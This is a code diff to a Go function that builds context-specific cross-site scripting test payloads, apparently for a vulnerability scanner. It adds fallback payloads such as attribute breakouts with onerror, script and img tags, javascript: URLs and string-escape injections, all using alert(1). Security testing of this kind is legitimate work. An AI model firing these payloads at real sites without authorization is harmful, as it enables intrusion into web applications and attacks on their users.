@@ -388,6 +388,11 @@ func GetPayloadsForContext(context string, filteredChars []string) []string {
 		if !hasFilter("`") {
 			payloads = append(payloads, "`;alert(1);//")
 		}
+		// Eğer hiçbir şey filtrelenmemişse alternatifler dene
+		if len(filteredChars) == 0 {
+			payloads = append(payloads, "';alert(1);//")
+			payloads = append(payloads, "\";alert(1);//")
+		}
 
 	case "attribute":
 		if !hasFilter("\"") {
@@ -403,6 +408,11 @@ func GetPayloadsForContext(context string, filteredChars []string) []string {
 		if !hasFilter("`") {
 			payloads = append(payloads, "` onerror=alert(1) ")
 		}
+		// Eğer hiçbir şey filtrelenmemişse alternatifler dene
+		if len(filteredChars) == 0 {
+			payloads = append(payloads, "\" onerror=alert(1) ")
+			payloads = append(payloads, "' onerror=alert(1) ")
+		}
 
 	case "html":
 		if !hasFilter("<") && !hasFilter(">") {
@@ -411,6 +421,12 @@ func GetPayloadsForContext(context string, filteredChars []string) []string {
 			payloads = append(payloads, "<svg onload=alert(1)>")
 			payloads = append(payloads, "<body onload=alert(1)>")
 			payloads = append(payloads, "<iframe src=javascript:alert(1)>")
+		}
+		// Eğer < ve > filtrelenmişse, alternatif payloadlar dene
+		if hasFilter("<") || hasFilter(">") {
+			// HTML encoding bypass denemeleri
+			payloads = append(payloads, "&lt;script&gt;alert(1)&lt;/script&gt;")
+			payloads = append(payloads, "<img src=x onerror=alert(1)>")
 		}
 
 	case "url":
@@ -421,11 +437,19 @@ func GetPayloadsForContext(context string, filteredChars []string) []string {
 		}
 
 	default:
-		// Genel payloadlar
-		if !hasFilter("<") && !hasFilter(">") {
-			payloads = append(payloads, "<script>alert(1)</script>")
-			payloads = append(payloads, "<img src=x onerror=alert(1)>")
-		}
+		// Genel payloadlar - her zaman dene
+		payloads = append(payloads, "<script>alert(1)</script>")
+		payloads = append(payloads, "<img src=x onerror=alert(1)>")
+		payloads = append(payloads, "javascript:alert(1)")
+		payloads = append(payloads, "';alert(1);//")
+		payloads = append(payloads, "\" onerror=alert(1) ")
+	}
+
+	// Eğer hiç payload eklenmemişse, en azından bazı temel payloadlar dene
+	if len(payloads) == 0 {
+		payloads = append(payloads, "<script>alert(1)</script>")
+		payloads = append(payloads, "<img src=x onerror=alert(1)>")
+		payloads = append(payloads, "javascript:alert(1)")
 	}
 
 	return payloads
